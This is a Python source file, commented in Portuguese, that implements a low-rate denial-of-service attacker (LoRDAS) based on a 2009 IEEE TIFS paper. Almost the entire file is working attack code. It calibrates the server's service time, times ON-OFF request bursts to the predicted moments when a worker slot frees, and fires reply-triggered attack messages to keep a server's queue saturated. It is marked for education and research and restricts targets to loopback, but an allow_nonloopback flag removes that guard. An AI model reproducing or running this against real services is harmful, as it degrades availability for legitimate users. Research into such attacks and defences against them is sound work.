"""
attacker.py — Atacante LoRDAS fiel a Maciá-Fernández et al. (IEEE TIFS, 2009).

Mecanismos implementados (todos os parâmetros do modelo expostos):
  (1) Forma de onda ON-OFF preditiva  <Δ, t_ontime, t_offtime>, com os pulsos
      da fase ativa sincronizados (phase-lock) aos instantes previstos de
      liberação de posição. T_ef = t_ontime + t_offtime.
  (2) Reply attack messages: uma nova mensagem de ataque a CADA resposta
      recebida (2º mecanismo do LoRDAS), para cobrir o intervalo ~RTT em que a
      posição fica livre.
  (3) Estimativa do tempo de serviço T_s ~ N(mean, var) a partir do tempo
      requisição->resposta (Eq. 1 do artigo).

USO EDUCACIONAL / PESQUISA. Preso a loopback por padrão.
"""
import math
import random
import socket
import threading

from common import RESP_OK, make_request_line, now

LOOPBACK = {"127.0.0.1", "localhost", "::1", "0.0.0.0"}


class LordasAttacker:
    def __init__(self, host="127.0.0.1", port=8080,
                 delta=0.005, t_ontime=0.01, t_offtime=0.015,
                 rtt_mean=0.0, rtt_var=0.0, n_workers_hint=4,
                 calibrate_n=30, use_replies=True, use_bursts=True,
                 sync_mode="freerate", src_ips=None, http_complete=True,
                 max_outstanding=512, allow_nonloopback=False):
        if host not in LOOPBACK and not allow_nonloopback:
            raise SystemExit(
                f"Recusando alvo fora de loopback: '{host}'. Ferramenta destinada a "
                f"pesquisa local. Use allow_nonloopback=True apenas para hosts que "
                f"voce possui e esta autorizado a testar."
            )
        self.host, self.port = host, port
        self.delta = delta
        self.t_on = t_ontime
        self.t_off = t_offtime
        self.T_ef = t_ontime + t_offtime
        self.rtt_mean, self.rtt_var = rtt_mean, rtt_var
        self.n_workers_hint = max(1, n_workers_hint)
        self.calibrate_n = calibrate_n
        self.use_replies = use_replies
        self.use_bursts = use_bursts
        # sync_mode: 'freerate' mira cada instante livre previsto (espaçamento T_s/N_s,
        # nucleo do LoRDAS); 'period' usa T_ef=t_on+t_off como periodo literal do pulso.
        self.sync_mode = sync_mode
        self.src_ips = list(src_ips) if src_ips else ["10.0.0.1"]
        self.http_complete = http_complete

        self.ts_mean = None    # estimativa de T_s (media)
        self.ts_var = None     # estimativa de T_s (variancia)

        self.seq = 0
        self.seq_lock = threading.Lock()
        self.running = threading.Event()
        self.sem = threading.Semaphore(max_outstanding)  # recursos finitos do atacante

        self.last_free_time = None
        self.free_lock = threading.Lock()

        # métricas
        self.sent_log = []   # (t_send, seq, kind)  kind: calib|bootstrap|burst|reply
        self.resp_log = []   # (t_recv, seq, rt, outcome)
        self.log_lock = threading.Lock()

    # ---- helpers ----
    def _pick_src(self):
        return random.choice(self.src_ips)

    def _next_seq(self):
        with self.seq_lock:
            self.seq += 1
            return self.seq

    def _rtt_sample(self):
        if self.rtt_mean <= 0:
            return 0.0
        return max(0.0, random.gauss(self.rtt_mean, math.sqrt(max(self.rtt_var, 0.0))))

    def _probe(self, seq):
        """Uma requisição sincrona; retorna (rt_efetivo, outcome) ou (None, None)."""
        t_send = now()
        try:
            rtt_out = self._rtt_sample()
            if rtt_out:
                threading.Event().wait(rtt_out)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60.0)
            s.connect((self.host, self.port))
            s.sendall(make_request_line("attacker", seq, self._pick_src(),
                                    1 if self.http_complete else 0))
            data = b""
            while not data.endswith(b"\n"):
                chunk = s.recv(64)
                if not chunk:
                    break
                data += chunk
            rtt_in = self._rtt_sample()
            if rtt_in:
                threading.Event().wait(rtt_in)
            rt = now() - t_send
            s.close()
            outcome = "ok" if data.startswith(RESP_OK) else "busy"
            return rt, outcome
        except OSError:
            return None, None

    # ---- envio assíncrono (mensagens de ataque) ----
    def _send_message(self, kind):
        if not self.running.is_set():
            return
        if not self.sem.acquire(blocking=False):
            return  # excede recursos -> mensagem descartada
        seq = self._next_seq()
        t_send = now()
        with self.log_lock:
            self.sent_log.append((t_send, seq, kind))
        threading.Thread(target=self._conn_worker, args=(seq, t_send), daemon=True).start()

    def _conn_worker(self, seq, t_send):
        try:
            rtt_out = self._rtt_sample()
            if rtt_out:
                threading.Event().wait(rtt_out)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(60.0)
            s.connect((self.host, self.port))
            s.sendall(make_request_line("attacker", seq, self._pick_src(),
                                    1 if self.http_complete else 0))
            data = b""
            while not data.endswith(b"\n"):
                chunk = s.recv(64)
                if not chunk:
                    break
                data += chunk
            rtt_in = self._rtt_sample()
            if rtt_in:
                threading.Event().wait(rtt_in)
            t_recv = now()
            rt = t_recv - t_send
            outcome = "ok" if data.startswith(RESP_OK) else "busy"
            try:
                s.close()
            except OSError:
                pass
            with self.log_lock:
                self.resp_log.append((t_recv, seq, rt, outcome))
            if outcome == "ok":
                self._on_free(t_recv, rt)
        except OSError:
            pass
        finally:
            self.sem.release()

    def _on_free(self, t_recv, rt):
        """Resposta servida => uma posição acabou de ser liberada."""
        with self.free_lock:
            self.last_free_time = t_recv
        # atualiza estimativa de T_s (EWMA em media e variancia)
        eff = max(rt - 2 * self.rtt_mean, 1e-4)
        if self.ts_mean is None:
            self.ts_mean, self.ts_var = eff, 1e-6
        else:
            a = 0.1
            d = eff - self.ts_mean
            self.ts_mean += a * d
            self.ts_var = (1 - a) * (self.ts_var + a * d * d)
        # (2) reply attack message
        if self.use_replies and self.running.is_set():
            self._send_message("reply")

    # ---- (3) calibração de T_s ----
    def calibrate(self):
        rts = []
        for _ in range(self.calibrate_n):
            seq = self._next_seq()
            t_send = now()
            rt, outcome = self._probe(seq)
            with self.log_lock:
                self.sent_log.append((t_send, seq, "calib"))
                if rt is not None:
                    self.resp_log.append((now(), seq, rt, outcome))
            if rt is not None and outcome == "ok":
                rts.append(max(rt - 2 * self.rtt_mean, 1e-4))
        if rts:
            m = sum(rts) / len(rts)
            v = sum((x - m) ** 2 for x in rts) / max(1, len(rts) - 1)
            self.ts_mean, self.ts_var = m, max(v, 1e-6)
        else:
            self.ts_mean, self.ts_var = 0.1, 1e-4
        return self.ts_mean, self.ts_var

    # ---- bootstrap: encher a fila inicialmente ----
    def _bootstrap(self):
        for _ in range(self.n_workers_hint * 2):
            self._send_message("bootstrap")
            threading.Event().wait(self.delta)

    # ---- (1) escalonador ON-OFF preditivo ----
    def _inter_free(self):
        """Espacamento medio entre liberacoes de posicao: tau = T_s / N_s (estimado)."""
        ts = self.ts_mean if self.ts_mean else 0.1
        return max(ts / self.n_workers_hint, 1e-4)

    def _emit_ontime(self, n_pkts):
        for _ in range(n_pkts):                              # fase ON: n_pkts a cada Δ
            if not self.running.is_set():
                break
            self._send_message("burst")
            threading.Event().wait(self.delta)

    def _burst_scheduler(self):
        n_pkts = int(self.t_on / self.delta) + 1
        while self.running.is_set() and self.last_free_time is None:
            threading.Event().wait(0.001)
        # periodo de repeticao dos pulsos:
        #  - 'freerate': tau = T_s/N_s  (mira CADA instante livre; nucleo do LoRDAS)
        #  - 'period'  : T_ef = t_on+t_off (parametrizacao literal da forma de onda)
        while self.running.is_set():
            period = self._inter_free() if self.sync_mode == "freerate" else self.T_ef
            with self.free_lock:
                base = self.last_free_time if self.last_free_time else now()
            target = base + period                           # proximo instante livre previsto
            start_send = target - self.rtt_mean - self.t_on / 2.0   # pulso "abraça" o alvo
            wait = start_send - now()
            if wait > 0:
                threading.Event().wait(min(wait, period))     # fase OFF (silencio)
                continue
            self._emit_ontime(n_pkts)

    # ---- execução ----
    def run(self, duration):
        self.running.set()
        if self.ts_mean is None:
            self.calibrate()
        self._bootstrap()
        if self.use_bursts:
            threading.Thread(target=self._burst_scheduler, daemon=True).start()
        t_end = now() + duration
        while now() < t_end and self.running.is_set():
            threading.Event().wait(0.02)
        self.running.clear()
        threading.Event().wait(0.1)

    # ---- métricas ----
    def attack_message_count(self):
        return len(self.sent_log)

    def attack_rate(self, duration):
        return len(self.sent_log) / duration if duration > 0 else 0.0
